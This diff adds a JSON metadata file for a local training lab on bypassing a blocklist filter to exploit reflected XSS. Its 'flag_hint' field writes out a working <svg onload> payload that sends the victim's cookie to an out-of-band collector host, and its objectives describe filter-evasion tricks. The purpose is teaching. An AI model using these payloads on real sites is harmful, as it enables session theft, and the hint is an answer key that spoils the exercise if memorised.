@@ -1,0 +1,45 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "reflected-xss-script-tag-filtered-ladder",
+  "title": "Reflected XSS — Filter Bypass Ladder (blocked <script> tags)",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 30,
+  "max_lifetime_minutes": 50,
+  "learning_objectives": [
+    "Recognise that a substring blocklist is a denylist, and that denylists fail open: they must enumerate every dangerous form and always miss some",
+    "Bypass a blocked <script> tag with an event-handler auto-firing element (<svg onload>, <img onload>) that the blocklist never names",
+    "Defeat a single-pass (non-recursive) filter by nesting a blocked token inside a split copy so removal reconstructs it",
+    "Evade a rigid substring match (onerror=) with a semantically-equivalent variant the parser accepts (onerror<whitespace>=)",
+    "Explain why an allowlist plus contextual output encoding (autoescaping templates) is the only robust fix"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["reflected-xss-search-noescape"],
+  "flag_hint": "The blocklist strips <script/</script/javascript:/onerror= once, in one pass, then reflects ?subject= raw into a <div>. Bypass it with /?subject=<svg onload=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"> submitted to POST /report; the admin bot fires it on load. Read the cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "single-pass substring blocklist filter (no html/template)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "reflected-xss",
+    "filter-bypass",
+    "blocklist",
+    "denylist",
+    "svg-onload",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The PortSwigger 'Reflected XSS with some SVG markup allowed' / blocked-tag filter-bypass lab family, abstracted for local Docker with a Playwright victim bot and an OOB collector"
+}
